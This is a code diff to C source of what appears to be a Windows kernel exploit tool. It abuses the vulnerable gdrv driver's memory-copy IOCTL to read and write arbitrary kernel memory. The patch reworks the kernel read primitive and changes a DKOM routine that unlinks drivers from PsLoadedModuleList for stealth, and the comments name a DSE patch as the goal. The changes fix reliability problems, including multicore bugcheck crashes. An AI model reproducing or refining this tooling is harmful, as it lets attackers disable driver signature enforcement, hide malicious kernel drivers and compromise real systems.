@@ -324,9 +324,14 @@ static BOOL gdrv_read(UINT64 kva, DWORD sz, UINT64 *out) {
     /* Step 2: read back from user-mode view of the same physical page */
     volatile PBYTE u = (volatile PBYTE)(ULONG_PTR)(KSHARED_UVA + SCRATCH_OFF);
     for(DWORD i = 0; i < sz && i < 8; i++) *out |= ((UINT64)u[i]) << (i * 8);
-    /* Step 3: restore scratch to 0 (ntoskrnl_kva+3 is always 0x00) */
-    GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)(g_ntoskrnl_kva + 3), sz};
-    DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
+    /* Step 3: restore scratch to 0, one byte at a time.
+       Using sz>1 with ntoskrnl+3 as src copied ntoskrnl bytes 3..3+sz into KSHARED,
+       which are NOT all zero and could corrupt adjacent KUSER_SHARED_DATA fields. */
+    UINT64 zero_src = g_ntoskrnl_kva + 3; /* offset 3 in ntoskrnl DOS stub is always 0x00 */
+    for(DWORD i = 0; i < sz; i++) {
+        GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF + i), (ULONG_PTR)zero_src, 1};
+        DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
+    }
     return TRUE;
 }
 static BOOL gdrv_write(UINT64 kva, UINT64 val, DWORD sz) {
@@ -1255,6 +1260,17 @@ static UINT32 disk_pe_export_rva(const BYTE *buf, SIZE_T bufsz, const char *name
  * PsLoadedModuleList is an exported DATA symbol in ntoskrnl.exe. */
 static void dkom_unlink_driver(UINT64 driver_kva) {
     if (!driver_kva || !g_ntoskrnl_kva) return;
+    /* gdrv MEMCPY cannot do atomic 64-bit pointer writes — requires 8 separate
+       1-byte IOCTLs per pointer, leaving a large window where PsLoadedModuleList
+       contains a half-written address.  On multi-core systems (observed: 32 CPUs)
+       any concurrent list walker hits that window → LIST_ENTRY corruption →
+       KERNEL_SECURITY_CHECK_FAILURE 0x139 param1=4.  Physical backends (LNV/TS)
+       use RMW on the physical page which is atomic at 64-bit granularity.
+       Skip DKOM on gdrv — stealth-only feature, not needed for DSE patch to work. */
+    if (g_backend == BE_GDRV) {
+        logf("[*] DKOM: skipping on gdrv backend (non-atomic 8-byte writes unsafe on SMP)");
+        return;
+    }
 
     UINT32 rva = 0;
     if (g_ntoskrnl_phys) {
